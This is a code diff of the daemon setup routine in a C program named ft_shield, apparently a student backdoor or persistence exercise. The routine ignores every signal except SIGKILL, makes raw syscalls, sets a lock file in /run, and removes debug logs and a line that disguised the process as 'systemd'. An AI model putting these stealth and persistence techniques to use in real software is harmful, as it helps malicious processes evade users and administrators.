@@ -14,14 +14,15 @@ void reset_signals() {
     sigset_t empty;
     sigemptyset(&empty);
     sigprocmask(SIG_SETMASK, &empty, NULL);
-    for (int sig = 1; sig < _NSIG; sig++) { // Ignorer certains signaux
+    for (int sig = 1; sig < _NSIG; sig++) { // Ignorer tout les signaux
         if (sig != SIGKILL)
             signal(sig, SIG_IGN);
     }
 }
 
 void handle_lock(int mod) {
-    const char *lock_file = "/tmp/ft_shield.lock";
+    const char *lock_file = "/run/ft_shield.lock";
+    
     int fd = sc(SYS_open, lock_file, O_CREAT | O_RDWR, 0644);
 
     if (mod == LOCK) {
@@ -38,7 +39,6 @@ void handle_lock(int mod) {
 
 void create_daemon() {
     pid_t pid = sc(SYS_fork);
-    log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
 
     if (pid < 0)
         sc(SYS_exit, EXIT_FAILURE);
@@ -56,19 +56,14 @@ void create_daemon() {
         sc(SYS_exit, EXIT_SUCCESS);
     close_fds();
     reset_signals();
-    write(log_fd, "persistence set\n", 17);
     handle_lock(LOCK);
-    write(log_fd, "lock set\n", 10);
-    sc(SYS_prctl, PR_SET_NAME, "systemd\0", NULL, NULL, NULL);
     sc(SYS_umask, 0);
     sc(SYS_chdir, "/");
     int fd = sc(SYS_open, "/dev/null", O_RDWR, 0);
     if (fd < 0)
-        exit(EXIT_FAILURE);
-    write(log_fd, "dev null open\n", 15);
+        sc(SYS_exit, EXIT_FAILURE);
     // redirection des flux standards vers /dev/null
     sc(SYS_dup2, fd, STDIN_FILENO);
     sc(SYS_dup2, fd, STDOUT_FILENO);
     sc(SYS_dup2, fd, STDERR_FILENO);
-    write(log_fd, "started\n", 9);
 }
